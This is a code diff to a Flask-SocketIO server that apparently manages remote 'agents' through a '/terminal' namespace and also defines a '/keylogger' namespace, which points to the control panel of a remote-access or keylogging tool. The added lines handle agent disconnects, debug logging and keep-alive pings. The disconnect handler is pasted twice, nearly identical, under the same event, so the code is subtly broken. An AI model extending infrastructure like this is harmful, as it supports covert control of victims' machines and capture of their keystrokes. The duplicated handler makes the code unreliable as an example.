@@ -59,6 +59,7 @@ def init_socket_handlers(socketio):
             active_agents[data['agent_id']] = True
             connection_count += 1
             print(f"[SocketIO] Agent authenticated. Total connections: {connection_count}")
+            print(f"[SocketIO] Current active_agents: {list(active_agents.keys())}")
             
             # Update database
             conn = sqlite3.connect(CONFIG.database)
@@ -87,6 +88,79 @@ def init_socket_handlers(socketio):
                 'agent_id': data['agent_id']
             }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
             return False
+
+    @socketio.on('disconnect', namespace='/terminal')
+    def handle_agent_disconnect():
+        nonlocal connection_count
+        # Remove agent from active_agents on disconnect
+        rooms = socketio.server.manager.rooms.get('/terminal', {})
+        disconnected_agents = []
+        for agent_id in list(active_agents.keys()):
+            if f"agent_{agent_id}" not in rooms:
+                disconnected_agents.append(agent_id)
+                active_agents.pop(agent_id, None)
+                connection_count -= 1
+                print(f"[SocketIO] Agent {agent_id} disconnected and removed from active_agents")
+                print(f"[SocketIO] Current active_agents after disconnect: {list(active_agents.keys())}")
+                
+                conn = sqlite3.connect(CONFIG.database)
+                c = conn.cursor()
+                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
+                conn.commit()
+                conn.close()
+                
+                emit('status', {
+                    'status': 'disconnected',
+                    'agent_id': agent_id
+                }, room=f"terminal_{agent_id}", namespace='/terminal')
+                
+                emit('ws_status', {
+                    'agent_id': agent_id,
+                    'action': 'stop',
+                    'status': 'success',
+                    'message': 'WebSocket disconnected'
+                }, room=f"terminal_{agent_id}", namespace='/terminal')
+        print(f"[SocketIO] Terminal client disconnected. Total connections: {connection_count}")
+
+    @socketio.on('disconnect', namespace='/terminal')
+    def handle_agent_disconnect():
+        nonlocal connection_count
+        # Remove agent from active_agents on disconnect
+        rooms = socketio.server.manager.rooms.get('/terminal', {})
+        disconnected_agents = []
+        for agent_id in list(active_agents.keys()):
+            if f"agent_{agent_id}" not in rooms:
+                disconnected_agents.append(agent_id)
+                active_agents.pop(agent_id, None)
+                connection_count -= 1
+                print(f"[SocketIO] Agent {agent_id} disconnected and removed from active_agents")
+                
+                conn = sqlite3.connect(CONFIG.database)
+                c = conn.cursor()
+                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
+                conn.commit()
+                conn.close()
+                
+                emit('status', {
+                    'status': 'disconnected',
+                    'agent_id': agent_id
+                }, room=f"terminal_{agent_id}", namespace='/terminal')
+                
+                emit('ws_status', {
+                    'agent_id': agent_id,
+                    'action': 'stop',
+                    'status': 'success',
+                    'message': 'WebSocket disconnected'
+                }, room=f"terminal_{agent_id}", namespace='/terminal')
+        print(f"[SocketIO] Terminal client disconnected. Total connections: {connection_count}")
+
+    @socketio.on('keep_alive', namespace='/terminal')
+    def handle_keep_alive(data):
+        # Simply acknowledge the keep_alive ping to keep connection alive
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            print(f"[SocketIO] Received keep_alive ping from agent {agent_id}")
+            emit('keep_alive_ack', {'status': 'success'}, room=f"terminal_{agent_id}", namespace='/terminal')
 
     @socketio.on('agent_connect', namespace='/keylogger')
     def handle_keylogger_agent_connect(data):
